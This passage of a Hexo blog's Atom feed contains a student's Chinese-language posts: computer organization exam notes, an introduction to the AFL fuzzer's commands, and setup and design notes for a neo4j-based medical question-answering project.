<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>mkx7&#39;blog</title>
  
  <subtitle>第一幕出现的枪第三幕中一定会响</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-09-06T06:42:36.640Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>mkx7</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ceshi</title>
    <link href="http://example.com/2021/09/06/ceshi/"/>
    <id>http://example.com/2021/09/06/ceshi/</id>
    <published>2021-09-06T02:03:43.000Z</published>
    <updated>2021-09-06T06:42:36.640Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><span id="more"></span><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% asset_img ./ceshi/<span class="number">1.</span>png This is an test image %&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![](ceshi/1.png)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>计算机组成原理期末复习</title>
    <link href="http://example.com/2021/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/"/>
    <id>http://example.com/2021/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/</id>
    <published>2021-06-09T07:26:50.000Z</published>
    <updated>2021-06-15T12:52:14.987Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>期末考试前看的b站唐朔飞老师的视频、王道视频和知乎上大神的笔记记录的一点笔记</p><span id="more"></span><h2 id="一、计算机组成原理概论"><a href="#一、计算机组成原理概论" class="headerlink" title="一、计算机组成原理概论"></a>一、计算机组成原理概论</h2><h3 id="计算机组成"><a href="#计算机组成" class="headerlink" title="计算机组成"></a>计算机组成</h3><p>硬件与软件逻辑上等效，但不等价，硬件执行效率更高，但执行过程复杂虽然可以完成功能但麻烦，软件执行效率低，但可执行功能多，与硬件相比易于操控。使用软件执行任务时就是软件对硬件进行控制，对指令进行有序执行，把计算机从下到上分为多个层次会封装下层，下层为上层提供API(接口)完成功能隐藏具体实现过线，如CPU的指令集即是对各硬件能实现的功能进行组合，从而向上层软件提供支持。</p><p>硬件：如CPU、I/O设备、磁盘等</p><p>从下到上可分为：理论/应用物理–&gt;电子元件–&gt;模拟电路–&gt;数字电路–&gt;数字逻辑–&gt;基本部件–&gt;计算机硬件。</p><p>软件：</p><p>系统软件：大部分直接使用硬件接口编写，直接操控硬件，为上层应用软件提供开发和运行环境，比如语言处理程序、操作系统、DBMS、分布式软件系统、网络软件系统、标准库程序、服务性程序、数据库管理系统等等。</p><p>应用软件：在系统软件的基础上使用高级语言编写的程序，通过系统软件调用硬件，可以根据用户需要进行编制。</p><h3 id="语言层次"><a href="#语言层次" class="headerlink" title="语言层次"></a>语言层次</h3><p>计算机语言从上到下可分为：高级语言、汇编语言、操作系统、机器语言、微指令系统。</p><p>操作系统及以上属于虚拟机器层次，机器语言属于实际机器，微指令系统属于微程序机器。</p><p>机器语言：二进制编码组成，是计算机唯一可以直接识别和执行的语言。<br>汇编语言：英文单词或其它缩写代替二进制的指令代码，更容易为人们记忆和理解，汇编语言程序必须经过汇编操作，将其转换为机器语言后，才能在计算机硬件上执行。<br>高级语言：需要经过编译程序编译成汇编语言程序，然后经过汇编操作得到机器语言程序，或者直接由高级语言程序翻译成机器语言程序。</p><h3 id="冯诺依曼计算机"><a href="#冯诺依曼计算机" class="headerlink" title="冯诺依曼计算机"></a>冯诺依曼计算机</h3><p>思想：”存储程序“，将程序保存在内存中，然后从内存中存放的首地址开始执行程序的第一条指令，并且以后按照程序的规定顺序去执行其他指令，直到程序执行完成。</p><p>五大部件：运算器ALU、控制器CU、存储器(主存、辅存)、输入设备、输出设备。</p><p>存储器中保存的指令和数据具有同等地位，根据地址寻找，指令由操作码和地址码组成，操作码指明需要进行的操作，地址码指明操作数地址。</p><p>最初的冯诺依曼计算机以运算器为中心，但因为运算和存储问题很容易形成瓶颈，后来优化为了以存储器为中心，但现代计算机大部分还是以存储器为中心。</p><p>存储器使用MAR(存储器地址寄存器)、MDR(存储器数据寄存器)寄存器存取数据，里边的结构从大到小有存储体、存储单元、存储元件。</p><h3 id="计算机完成一条指令的过程"><a href="#计算机完成一条指令的过程" class="headerlink" title="计算机完成一条指令的过程"></a>计算机完成一条指令的过程</h3><p>计算机完成一条指令首先需要去存储器读取指令，读取指令使用CU的PC寄存器去保存当前执行指令地址的寄存器，然后根据PC寄存器地址读取指令，将读取的指令送到CU中的IR寄存器中进行解析，解析完成后还需要CU控制相应部件完成指令，并且PC寄存器的值自动加1，顺序执行指令，解析完指令后需要对指令进行操作，如指令如果要对数据运算则需要使用CU控制去存储器或其他存储设备中读取数据到ALU的ACC寄存器中，如去存储器中读取数据需要用到MAR、MDR寄存器，步骤为PC将地址传入MAR寄存器，然后根据MAR寄存器中保存的地址在CU的控制下去存储器中寻找数据，找到数据后将数据传入MDR寄存器，使用MDR寄存器将数据传入到ACC寄存器中，之后的指令数据处理使用ALU根据不同的运算操作进行不同处理。</p><h3 id="性能指标"><a href="#性能指标" class="headerlink" title="性能指标"></a>性能指标</h3><p>机器字长：CPU一次能处理的二进制位数，与CPU寄存器位数有关，一般是字节的整数倍，机器字长会影响CPU在执行指令时的效率。</p><p>带宽：数据一次所能并行传送信息的位数，是外部数据总线的位数。</p><p>主存容量：主存储器的容量，一般用“字数*字长”表示，或者用字节衡量。</p><p>运算速度”指标的含义是每秒能执行多少条指令而不是别的(比如操作系统的命令)。</p><p>吞吐量(综合参数)：单位时间内能处理请求的数量，主要取决于主存的存取周期。</p><p>响应时间：从发出请求到获得结果的时间，包括运行时间、等待时间。</p><p>CPU时钟周期：CPU中最小的时间单位。指令周期&gt;CPU周期(机器周期)&gt;时钟周期。</p><p>CPU时钟频率/主频：每秒发生的时钟周期数，是CPU时钟周期的倒数。是衡量机器速度的重要参数。</p><p>运算速度：</p><p>CPI(Clock cycle Per Instruction)：执行一条指令所需的时钟周期数。系统结构、指令集、计算机组织都会影响CPI，时钟频率不产生影响，只会影响指令的执行速度。</p><p>CPU执行时间(运行一个程序的时间)=CPU时钟周期数/主频=指令条数*CPI/主频</p><p>主频、CPI、指令条数是影响CPU执行时间的三个因素，它们互相制约。<br>因此，减少CPU执行时间的措施有：1、提高CPU时钟频率(主频)；2、优化数据通路，减少CPI值；3、对程序进行编译优化，减少指令条数。</p><p>MIPS(Million Instructions Per Second)：每秒执行多少百万条指令=主频/CPI</p><p>MFLOPS：每秒执行多少百万次浮点运算</p><p>GFLOPS：每秒执行多少十亿次浮点运算</p><p>TFLOPS：每秒执行多少万亿次浮点运算</p><h2 id="二、计算机发展"><a href="#二、计算机发展" class="headerlink" title="二、计算机发展"></a>二、计算机发展</h2><p>计算机的硬件发展分为：电子管→晶体管→中小规模集成电路→大规模集成电路→超大规模集成电路。</p><p>软件经历了面向机器的机器语言，面向机器的汇编语言，面向问题的高级语言三大过程。</p><p>早期编程直接使用机器语言，对硬件指令集进行编程，后来发展出汇编语言，相比机器语言更容易记忆，但还是属于对机器编程，最后也就是现在使用的高级语言，面向过程、面向对象编程使程序员不必在意底层的硬件实现，可以直接针对问题进行编码，系统软件是面向硬件编程，管理硬件资源，解决硬件问题，为上层软件提供/维护运行环境的一类软件，操作系统是系统软件的一类，是软件的底层。系统软件的应用使上层软件开发者，计算机的使用者不必在意底层的硬件工作。语言处理程序(汇编，编译，解释程序)，服务性程序（装配，调试，诊断，排错），数据库管理系统，网络软件也属于系统软件。</p><p>摩尔定律：</p><p>CPU发展过程中，新一代的CPU约每隔18-24个月就会发布，其包含的晶体管数量会较上一代增加一倍，性能也会提升一倍。</p><p>随着晶体管的不断缩小，集成度不断增大，集成电路芯片已经逐步顶到了电介质传导速度和量子隧穿效应两大天花板，导致如今的发展较摩尔定律预测逐步放缓，逐渐达到集成电路这种构造模式的瓶颈，变的停滞不前。</p><h2 id="三、总线"><a href="#三、总线" class="headerlink" title="三、总线"></a>三、总线</h2><p>总线是连接计算机中各部件进行信息传输的公共通信干线，是各个部件进行数据共享的传输介质，本质是信号的公共传输线，同一时间内一条总线只允许一对设备进行相互通信。</p><h3 id="总线分类"><a href="#总线分类" class="headerlink" title="总线分类"></a>总线分类</h3><p>片内总线、系统总线、通信总线。各总线作用：</p><p>片内总线：CPU芯片内部寄存器与寄存器间，寄存器与ALU之间的公共连接线</p><p>系统总线：计算器系统中重要部件之间的连接总线</p><p>通信总线：计算机系统间或计算机系统与其他系统间信息传输的总线</p><p>系统总线又分为：数据总线、地址总线、控制总线。</p><p>数据总线：双向传输，用于在CPU和存储器或其他输入输出设备间传送数据，传送位数与机器字长、存储字长有关，数据不局限于真正的数据，可以是指令代码、状态信息、控制信息等。</p><p>地址总线：单向传输，指出数据总线上的源数据或目的数据所在主存单元或I/O端口的地址，位数与存储单元个数有关。</p><p>控制总线：传输控制信息，包括CPU送出的控制命令和主存(或外设)返回CPU的反馈信号</p><h3 id="总线传输方式"><a href="#总线传输方式" class="headerlink" title="总线传输方式"></a>总线传输方式</h3><p>串行传输：只使用一条信道，逐步发送一串二进制数据来传输数据</p><p>并行传输：使用多条信道，同时发送多位二进制数据</p><h3 id="总线传输过程"><a href="#总线传输过程" class="headerlink" title="总线传输过程"></a>总线传输过程</h3><p>1、申请分配阶段：根据判优控制分配下一周期的总线使用权，包括传输请求，总线仲裁</p><p>2、寻址阶段：主模块向从模块给出地址和命令</p><p>3、传输阶段：主模块和从模块进行数据交换</p><p>4、结束阶段：信息从总线撤除，让出总线使用权</p><p>总线判优(仲裁)控制：集中式、分布式</p><p>集中式：集中所有总线根据仲裁算法进行仲裁，方式包括：链式查询、计数器定时查询、独立请求方式。</p><p>分部仲裁方式：使用每个模块自己的仲裁号和仲裁器，当接收到总线请求后将各模块的仲裁号发送到共享的仲裁总线上，每个仲裁器对比仲裁号，根据仲裁号优先级确定是否对总线请求予以响应。</p><p>猝发传输方式：一个总线周期内传输存储地址连续的多个数据字，一次传输一个地址和一批地址连续的数据</p><h3 id="通信方式"><a href="#通信方式" class="headerlink" title="通信方式"></a>通信方式</h3><p>同步通信、异步通信、半同步通信、分离式通信</p><p>同步通信：系统采用一个统一的时钟信号协调发送和接收双方的传送定时关系，时钟产生相等的时间间隔，每个间隔构成一个总线周期，在一个总线周期中发送方和接收方可以进行一次数据传送。优点传送速度快，总线控制逻辑简单，缺点可靠性差</p><p>异步通信：由通信双方相互制约的握手信号实现定时控制，主设备发出请求信号，从设备接收请求信号后发出回答信号，之后双方交换数据。优点总线周期长度可变，能保证两个工作速度相差较大的部件或设备间可靠的交换信息，自动适应时间的配合，缺点是这种方式与同步通信比较复杂，效率低。</p><p>异步通信包括3种锁方式，不互锁方式、半互锁方式、全乎锁方式。</p><p>不互锁方式：主设备发出请求信号后，不必等到从设备的回答信号，而是经过一段时间便撤销请求信号。</p><p>半互锁方式：主设备发出请求信号后，必须在接到从设备的回答信号后，才撤销请求信号，有互锁的关系。</p><p>全互锁方式：主设备发出请求信号后，必须在从设备回答后才撤销请求信号；从设备发出”回答”信号后，必须在获知主设备”请求”信号已撤销后，再撤销其”回答”信号。</p><p>半同步通信：同步通信和异步通信的结合，时钟前沿主设备发送信号，时钟后延从设备判断识别信号反馈响应，主设备不需要必须在某个时钟周期内完成固定工作，按照自己的速度独立运行即可。</p><p>分离式通信：主设备发送地址和指令信号，从设备准备数据，主从设备完成数据收发，正因为分离式通信是在第二步从设备准备数据时让其他真正需要使用总线传输数据的设备占用总线避免占而不用的情况所以能够挖掘每一瞬间的潜能。</p><h3 id="总线性能指标"><a href="#总线性能指标" class="headerlink" title="总线性能指标"></a>总线性能指标</h3><p>总线周期：包括申请阶段、寻址阶段、传输阶段、结束阶段。注意不同于时钟周期。</p><p>工作频率：总线周期的倒数。</p><p>时钟频率：时钟周期的倒数。</p><p>总线宽度：数据总线的位数。</p><p>总线带宽：总线的数据传输率。</p><p>总线复用：一种信号线在不同的时间传输不同的信息，可以使用较少的线传输更多的信息，节约空间和成本。</p><p>信号线数：3种总线数之和。</p><h2 id="四、存储器"><a href="#四、存储器" class="headerlink" title="四、存储器"></a>四、存储器</h2>]]></content>
    
    
    <summary type="html">&lt;p&gt;期末考试前看的b站唐朔飞老师的视频、王道视频和知乎上大神的笔记记录的一点笔记&lt;/p&gt;</summary>
    
    
    
    
    <category term="计算机组成" scheme="http://example.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90/"/>
    
  </entry>
  
  <entry>
    <title>AFL学习</title>
    <link href="http://example.com/2021/06/07/AFL%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2021/06/07/AFL%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-06-07T12:08:26.000Z</published>
    <updated>2021-06-07T13:19:06.491Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><span id="more"></span><p>AFL是fuzz工具中入门常见的工具，本文先介绍下AFL的使用再分析AFL的工作原理最后学习fuzz。</p><h2 id="AFL的使用"><a href="#AFL的使用" class="headerlink" title="AFL的使用"></a>AFL的使用</h2><p>因为AFL是之前就安装好了但一直拖到现在才学就省略了安装过程，检验AFL是否安装完成：</p><p><img src="/2021/06/07/AFL%E5%AD%A6%E4%B9%A0/../../../cach/image-20210607203614259.png" alt="image-20210607203614259"></p><p>afl的各种命令：</p><p><img src="/2021/06/07/AFL%E5%AD%A6%E4%B9%A0/../../../cach/image-20210607203827910.png" alt="image-20210607203827910"></p><p>下面是一些命令的功能介绍，不全以后看到再补充：</p><p>afl-gcc 和afl-g++分别对应gcc和g++的封装<br>afl-clang 和afl-clang++分别对应clang的c和c++编译器封装<br>afl-fuzz 是AFL 的主体，用于对目标程序进行fuzz<br>afl-analyze 可以对用例进行分析，通过分析给定的用例，看能否发现用例中有意义的字段。<br>afl-qemu-trace 用于qemu-mode，默认不安装，需要手工执行qemu-mode 的编译脚本进行编译，后面会介绍。<br>afl-plot 生成测试任务的状态图<br>afl-tmin 和afl-cmin 对用例进行简化<br>afl-whatsup 用于查看fuzz 任务的状态<br>afl-gotcpu 用于查看当前CPU 状态<br>afl-showmap 用于对单个用例进行执行路径跟踪<br>拿一个自身存在漏洞的程序插桩编译一下(编译时会报错，因为程序本身就带有漏洞)，后面测试编译后的程序(有源代码白盒测试)：</p><p><img src="/2021/06/07/AFL%E5%AD%A6%E4%B9%A0/../../../cach/image-20210607204643757.png" alt="image-20210607204643757"></p><p><img src="/2021/06/07/AFL%E5%AD%A6%E4%B9%A0/../../../cach/image-20210607204837410.png" alt="image-20210607204837410"></p><p>ps：测试有makefile文件的项目时必须将CC和CXX加入环境变量：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> CC=afl-clang；<span class="built_in">export</span> CXX=afl-clang++；</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="fuzz" scheme="http://example.com/tags/fuzz/"/>
    
  </entry>
  
  <entry>
    <title>python期末项目</title>
    <link href="http://example.com/2021/06/05/python%E6%9C%9F%E6%9C%AB%E9%A1%B9%E7%9B%AE/"/>
    <id>http://example.com/2021/06/05/python%E6%9C%9F%E6%9C%AB%E9%A1%B9%E7%9B%AE/</id>
    <published>2021-06-05T13:41:01.000Z</published>
    <updated>2021-06-07T11:06:16.899Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>python期末项目学习记录</p><span id="more"></span><p>期末项目因为时间问题没有自己做，就在GitHub上找了个项目替代，正好想了解一下人工智能，就找了个刘焕勇老师的项目来学习下nlp(自然语言处理，人工智能下的一个分支)。</p><p>项目地址：<a href="https://github.com/liuhuanyong/QASystemOnMedicalKG">https://github.com/liuhuanyong/QASystemOnMedicalKG</a></p><h2 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h2><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>环境Ubuntu20.04</p><p>需要使用的工具：Java8(openjdk1.8.0_292)、neo4j数据库(本人neo4j3-5.28)、python3(本人python3.8.5)，剩下的一些零碎python包根据使用时报错提示下载即可</p><p>Java安装步骤略。</p><p>neo4j下载地址：<a href="https://neo4j.com/download-thanks/?edition=community&amp;release=3.5.28&amp;flavour=unix&amp;_gl=1">https://neo4j.com/download-thanks/?edition=community&amp;release=3.5.28&amp;flavour=unix&amp;_gl=1</a></p><p>Ubuntu下载好后解压完先进入conf修改neo4j.conf文件，找到下面的代码后去掉注释#：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 允许远程访问</span><br><span class="line">dbms.connectors.default_listen_address=0.0.0.0</span><br><span class="line"># 开启bolt服务，默认端口7687</span><br><span class="line">dbms.connector.bolt.listen_address=:7687</span><br><span class="line"># 开启http服务，默认端口7474</span><br><span class="line">dbms.connector.http.listen_address=:7474</span><br><span class="line"># 开启https服务，默认端口7473</span><br><span class="line">dbms.connector.https.listen_address=:7473</span><br></pre></td></tr></table></figure><p>然后进入bin文件，先chmod +x neo4j赋予neo4j运行权限，再输入./neo4j console运行neo4j：</p><p><img src="/2021/06/05/python%E6%9C%9F%E6%9C%AB%E9%A1%B9%E7%9B%AE/../../../cach/image-20210605220135261.png" alt="image-20210605220135261"></p><p>之后打开<a href="http://localhost:7474/%E5%8E%BB%E9%85%8D%E7%BD%AEneo4j%EF%BC%8C%E5%88%9D%E5%A7%8B%E8%B4%A6%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81%E9%83%BD%E6%98%AFneo4j%EF%BC%8C%E7%99%BB%E5%BD%95%E5%90%8E%E8%87%AA%E5%8A%A8%E4%BF%AE%E6%94%B9%EF%BC%8C%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81%E5%8A%A1%E5%BF%85%E8%AE%B0%E4%BD%8F%E5%90%8E%E9%9D%A2%E4%BC%9A%E7%94%A8%EF%BC%8C%E5%8F%A6%E5%A4%96%E6%9C%8D%E5%8A%A1%E5%85%88%E5%88%AB%E5%85%B3%E9%97%AD%E3%80%82">http://localhost:7474/去配置neo4j，初始账户名和密码都是neo4j，登录后自动修改，修改密码务必记住后面会用，另外服务先别关闭。</a></p><h3 id="项目配置"><a href="#项目配置" class="headerlink" title="项目配置"></a>项目配置</h3><p>下载好项目后解压进入文件中，找到这个py脚本，将build_medicalgraph.py和answer_search.py中的self.g=Graph·······换成self.g = Graph(“<a href="http://localhost:7474&quot;">http://localhost:7474&quot;</a>, auth=(“你的neo4j账户名”,”你的密码”))，之后运行这个py脚本向neo4j内导入数据：</p><p><img src="/2021/06/05/python%E6%9C%9F%E6%9C%AB%E9%A1%B9%E7%9B%AE/../../../cach/image-20210605220716356.png" alt="image-20210605220716356"></p><p>ps：导入时间较长，大约几个小时</p><p>完成后neo4j服务不要关闭，再运行chatbot_graph.py即可正常运行：</p><p><img src="/2021/06/05/python%E6%9C%9F%E6%9C%AB%E9%A1%B9%E7%9B%AE/../../../cach/image-20210606121917658.png" alt="image-20210606121917658"></p><h2 id="项目实现"><a href="#项目实现" class="headerlink" title="项目实现"></a>项目实现</h2><p>以上是直接使用刘老师写好的文件，之后分析下时该项目如何实现的。</p><h3 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h3><p>本项目是一个以医学为中心的医药领域问答系统，主要包括两部分数据整理与问答系统，获取数据使用爬虫，储存数据使用Neo4j，数据操作采用neo4j的cypher查询语言，以结构化数据为主构建以医药为中心的医疗知识图谱，包含7类数量为4.4万的知识实体，11类数量为30万实体关系的知识图谱，问答系统基于规则匹配实现，根据知识图谱完成自动问答与分析服务。</p><p>实现重点在于实现基于垂直网站数据的医药知识图谱构建和基于医药知识图谱的自动问答。</p><p>7类知识实体：</p><table><thead><tr><th>实体类型</th><th>含义</th><th>数量</th></tr></thead><tbody><tr><td>check</td><td>检查诊断项目</td><td>3353</td></tr><tr><td>department</td><td>科目</td><td>54</td></tr><tr><td>disease</td><td>疾病</td><td>8807</td></tr><tr><td>drug</td><td>药品</td><td>3828</td></tr><tr><td>food</td><td>食物</td><td>4870</td></tr><tr><td>producer</td><td>药品</td><td>17201</td></tr><tr><td>symptom</td><td>疾病症状</td><td>5998</td></tr></tbody></table><p>10类实体关系：</p><table><thead><tr><th>实体关系类型</th><th>含义</th><th>数量</th></tr></thead><tbody><tr><td>belongs_to</td><td>属于</td><td>8844</td></tr><tr><td>common_drug</td><td>疾病常吃药品</td><td>14649</td></tr><tr><td>do_eat</td><td>疾病常吃食物</td><td>22238</td></tr><tr><td>drugs_of</td><td>在售药品</td><td>17315</td></tr><tr><td>need_check</td><td>疾病检查</td><td>39422</td></tr><tr><td>no_eat</td><td>疾病忌吃食物</td><td>22247</td></tr><tr><td>recommand_drug</td><td>疾病推荐药品</td><td>59467</td></tr><tr><td>recommand_eat</td><td>疾病推荐食谱</td><td>40221</td></tr><tr><td>has_symptom</td><td>疾病症状</td><td>5998</td></tr><tr><td>acompany_with</td><td>疾病并发疾病</td><td>12029</td></tr></tbody></table><p>知识图谱属性类型：</p><table><thead><tr><th>属性类型</th><th>含义</th></tr></thead><tbody><tr><td>name</td><td>疾病名称</td></tr><tr><td>desc</td><td>疾病简介</td></tr><tr><td>cause</td><td>疾病病因</td></tr><tr><td>prevent</td><td>预防措施</td></tr><tr><td>cure_lasttime</td><td>治疗周期</td></tr><tr><td>cure_way</td><td>治疗方式</td></tr><tr><td>cured_prob</td><td>治愈概率</td></tr><tr><td>easy_get</td><td>疾病易感人群</td></tr></tbody></table><p>项目优点：采用规则匹配方式建立了完善的问题查询与回答机制，使用方便。</p><p>项目缺点：数据不够详细，一些问题如疾病的引发、预防等回答结果用一大段文字描述不够精准，这点可通过引入事件抽取将原因结构化表示进行优化。</p><h3 id="项目层次"><a href="#项目层次" class="headerlink" title="项目层次"></a>项目层次</h3><p><img src="/2021/06/05/python%E6%9C%9F%E6%9C%AB%E9%A1%B9%E7%9B%AE/../../../cach/image-20210606134343308.png" alt="image-20210606134343308"></p><p><img src="/2021/06/05/python%E6%9C%9F%E6%9C%AB%E9%A1%B9%E7%9B%AE/../../../cach/image-20210606135433423.png" alt="image-20210606135433423"></p><p><img src="/2021/06/05/python%E6%9C%9F%E6%9C%AB%E9%A1%B9%E7%9B%AE/../../../cach/image-20210606134630905.png" alt="image-20210606134630905"></p><h3 id="项目目录"><a href="#项目目录" class="headerlink" title="项目目录"></a>项目目录</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">├── QASystemOnMedicalKG                #  项目名称</span><br><span class="line">    ├── answer_search.py               #  问题查询及返回查询结果</span><br><span class="line">    ├── build_medicalgraph.py          #  将结构化json数据导入neo4j数据库</span><br><span class="line">    ├── chatbot_graph.py               #  问答程序脚本</span><br><span class="line">    ├── QASystemOnMedicalKG/data       #  数据</span><br><span class="line">        ├── hepatopathy.json           #  肝病知识数据</span><br><span class="line">        ├── medical.json               #  全部知识数据</span><br><span class="line">    ├── QASystemOnMedicalKG/dict       #  关系</span><br><span class="line">        ├── check.txt                  #  诊断检查项目实体库</span><br><span class="line">        ├── deny.txt                   #  否定词库</span><br><span class="line">        ├── department.txt             #  医疗科目实体库</span><br><span class="line">        ├── disease.txt                #  疾病实体库</span><br><span class="line">        ├── drug.txt                   #  药品实体库</span><br><span class="line">        ├── food.txt                   #  食物实体库</span><br><span class="line">        ├── producer.txt               #  在售药品库</span><br><span class="line">        ├── symptom.txt                #  疾病症状实体库</span><br><span class="line">    ├── QASystemOnMedicalKG/prepare_data</span><br><span class="line">        ├── build_data.py              #  数据库操作脚本</span><br><span class="line">        ├── data_spider.py             #  数据采集脚本</span><br><span class="line">        ├── max_cut.py                 #  基于词典的最大前向/后向匹配</span><br><span class="line">    ├── question_classifier.py         #  问句类型分类脚本</span><br><span class="line">    ├── question_parser.py             #  问句解析脚本</span><br></pre></td></tr></table></figure><h3 id="数据采集"><a href="#数据采集" class="headerlink" title="数据采集"></a>数据采集</h3><p>数据采集部分使用的data_spider.py爬虫脚本，爬取的<a href="http://jib.xywy.com/%E7%BD%91%E7%AB%99%E4%B8%8A%E7%9A%84%E6%95%B0%E6%8D%AE%EF%BC%8C%E7%88%AC%E8%99%AB%E4%BD%BF%E7%94%A8%E7%9A%84urllib%E5%BA%93%EF%BC%8C%E7%88%AC%E5%8F%96%E7%9A%84%E6%95%B0%E6%8D%AE%E6%A0%B9%E6%8D%AE%E5%88%86%E7%B1%BB%E5%88%86%E4%B8%BA7%E7%A7%8D%E6%94%BE%E5%9C%A8MongoDB%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%EF%BC%8C%E5%85%B6%E4%B8%AD%E5%85%B3%E4%BA%8E%E5%B9%B6%E5%8F%91%E7%97%87%E9%83%A8%E5%88%86%E7%9A%84%E6%95%B0%E6%8D%AE%E4%BD%BF%E7%94%A8%E4%BA%86max_cut%E5%8C%B9%E9%85%8D%E8%84%9A%E6%9C%AC%E4%B8%AD%E7%9A%84%E5%8F%8C%E5%90%91%E6%9C%80%E5%A4%A7%E5%90%91%E5%89%8D%E5%8C%B9%E9%85%8Dmax_biward_cut%E3%80%82">http://jib.xywy.com/网站上的数据，爬虫使用的urllib库，爬取的数据根据分类分为7种放在MongoDB数据库中，其中关于并发症部分的数据使用了max_cut匹配脚本中的双向最大向前匹配max_biward_cut。</a></p><h3 id="数据存储"><a href="#数据存储" class="headerlink" title="数据存储"></a>数据存储</h3><p>数据存储部分使用的build_medicalgraph.py脚本。init初始化连接neo4j数据库并获取存储数据的文件路径。read_nodes读取文件中的数据，并获取实体和实体间的关系。create_node创建不包含属性的neo4j数据库节点。create_diseases_nodes创建带有属性的neo4j数据库节点。create_graphnodes创建知识图谱实体。create_graphrels创建知识图谱关系。create_relationship创建实体关系边。export_data方法导出数据到TXT文件中。</p><h3 id="问答实现"><a href="#问答实现" class="headerlink" title="问答实现"></a>问答实现</h3><p>本项目的问答系统完全基于规则匹配实现，通过关键词匹配对问题进行分类，因为该项目中的问题都是医疗问题，问题本身答案有限封闭，所以可以对查询问题进行穷举并分类，之后使用cypher查询语言的match去匹配查找neo4j数据库中存储的数据，根据返回数据组装问句回答，最后返回结果，因为数据量问题，可能存在没有相关数据的问题，如果没有相关数据则返回提前设置好的回答结果。</p><p>大致实现流程为：对问题进行分类，提取其中的关键词，对关键词进行分类，根据关键词对数据进行匹配，返回匹配结果，整理结果返回答案。</p><h4 id="问答脚本"><a href="#问答脚本" class="headerlink" title="问答脚本"></a>问答脚本</h4><p>chatbot_graph.py脚本是该项目的问答框架，主要实现问题分析、数据查询、返回答案三部分。</p><p>具体实现为init实例化handler，chat_main先接收问题，再对输入问题进行分类，不存在此类问题则返回默认回答，存在此类问题则调用搜索数据的脚本，找到相应数据后返回数据并输出回答。</p><h4 id="问题分类"><a href="#问题分类" class="headerlink" title="问题分类"></a>问题分类</h4><p>question_classifiler.py负责对读取问题的分类。</p><p>init先读取问题中的所有特征词，之后根据所有特征词构造领域的actree(便于后续的特征词提取)，再获取特征词类型并根据特征词构造该问题的特征词词典。classify根据特征词词典对问题进行分类并判断问题类型，如果不存在该问题类型则直接返回相关问题的特征词描述信息，若查到则将分类问题的类型及特征词进行合并组装成字典并返回。</p><h4 id="问题分析"><a href="#问题分析" class="headerlink" 